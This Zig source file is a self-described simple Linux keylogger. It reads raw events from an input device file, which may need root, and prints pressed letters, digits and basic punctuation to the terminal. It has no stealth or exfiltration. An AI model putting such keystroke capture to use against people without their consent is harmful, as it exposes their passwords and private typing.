//! Dumb keylogger for linux.
//! Zig version: 0.16.0

const std = @import("std");
const Io = std.Io;
const linux = @import("linux");

const KeyAction = enum(i32) {
    PRESSED = 1,
    RELEASED = 0,
    HOLD = 2,
};

const KeyCode = enum(i32) {
    // zig fmt: off
    // letters
    a = linux.KEY_A, b = linux.KEY_B, c = linux.KEY_C,
    d = linux.KEY_D, e = linux.KEY_E, f = linux.KEY_F,
    g = linux.KEY_G, h = linux.KEY_H, i = linux.KEY_I,
    j = linux.KEY_J, k = linux.KEY_K, l = linux.KEY_L,
    m = linux.KEY_M, n = linux.KEY_N, o = linux.KEY_O,
    p = linux.KEY_P, q = linux.KEY_Q, r = linux.KEY_R,
    s = linux.KEY_S, t = linux.KEY_T, u = linux.KEY_U,
    v = linux.KEY_V, w = linux.KEY_W, x = linux.KEY_X,
    y = linux.KEY_Y, z = linux.KEY_Z,

    // numbers
    zero  = linux.KEY_0, one   = linux.KEY_1, two   = linux.KEY_2,
    three = linux.KEY_3, four  = linux.KEY_4, five  = linux.KEY_5,
    six   = linux.KEY_6, seven = linux.KEY_7, eight = linux.KEY_8,
    nine  = linux.KEY_9,

    // keypad numbers
    zero_kp  = linux.KEY_KP0, one_kp   = linux.KEY_KP1, two_kp   = linux.KEY_KP2,
    three_kp = linux.KEY_KP3, four_kp  = linux.KEY_KP4, five_kp  = linux.KEY_KP5,
    six_kp   = linux.KEY_KP6, seven_kp = linux.KEY_KP7, eight_kp = linux.KEY_KP8,
    nine_kp  = linux.KEY_KP9,

    // special
    space = linux.KEY_SPACE,
    comma = linux.KEY_COMMA,
    dot = linux.KEY_DOT,
    enter = linux.KEY_ENTER,
    // zig fmt: on

    pub fn toString(self: KeyCode) []const u8 {
        return switch (self) {
            .space => " ",
            .comma => ",",
            .dot => ".",
            .enter => "\n",
            .one, .one_kp => "1",
            .two, .two_kp => "2",
            .three, .three_kp => "3",
            .four, .four_kp => "4",
            .five, .five_kp => "5",
            .six, .six_kp => "6",
            .seven, .seven_kp => "7",
            .eight, .eight_kp => "8",
            .nine, .nine_kp => "9",
            else => |letter| @tagName(letter),
        };
    }
};

pub fn main(init: std.process.Init) !void {
    const arena = init.arena.allocator();
    const args = try init.minimal.args.toSlice(arena);
    const io = init.io;

    if (args.len != 2) {
        std.process.fatal("Usage: ./key_logger <device_file>. Elevated privileges may be needed.\n", .{});
    }

    const filename = args[1];

    const file = Io.Dir.openFileAbsolute(io, filename, .{ .mode = .read_only }) catch |err| {
        std.process.fatal("Cannot open file '{s}': {t}\n", .{ filename, err });
    };
    defer file.close(io);

    var read_buf: [1024]u8 = undefined;
    var file_reader = file.reader(io, &read_buf);
    const reader = &file_reader.interface;

    while (reader.takeStruct(linux.input_event, .little)) |ev| {
        if (ev.type != linux.EV_KEY)
            continue;

        const key = std.enums.fromInt(KeyCode, ev.code) orelse continue;
        const action = std.enums.fromInt(KeyAction, ev.value) orelse continue;

        if (action == .PRESSED) {
            std.debug.print("{s}", .{key.toString()});
        }
    } else |err| {
        std.log.err("Cannot read input event: {t}", .{err});
    }
}
